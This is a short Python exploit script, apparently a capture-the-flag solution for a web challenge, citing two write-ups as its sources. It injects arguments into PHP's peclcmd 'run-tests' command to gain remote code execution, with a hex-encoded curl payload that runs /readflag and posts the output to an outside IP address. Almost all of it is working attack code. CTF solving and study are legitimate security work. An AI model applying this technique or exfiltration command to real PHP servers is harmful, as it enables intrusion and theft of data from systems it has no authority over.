import asyncio
from subprocess import check_output

URL = "http://localhost:51669"
URL = "https://cyberchampion-web-file-not-found-v2-app-1.chals.io"

async def main():
    payload = '''curl http://172.188.90.64:4444 -XPOST --data "`/readflag`"'''
    payload = payload.encode().hex()
    url = f"""{URL}/usr/local/lib/php/peclcmd.php%3f/?+run-tests+-i+-r'system(hex2bin("{payload}"));'+/usr/local/lib/php/test/Console_Getopt/tests/bug11068.phpt"""
    res = check_output(['curl', url])
    print(res.decode())

if __name__ == "__main__":
    asyncio.run(main())

"""
reference:
- https://github.com/zeyu2001/My-CTF-Challenges/tree/main/SEETF-2023/readonly
- https://blog.wm-team.cn/index.php/archives/82/#havefun
"""
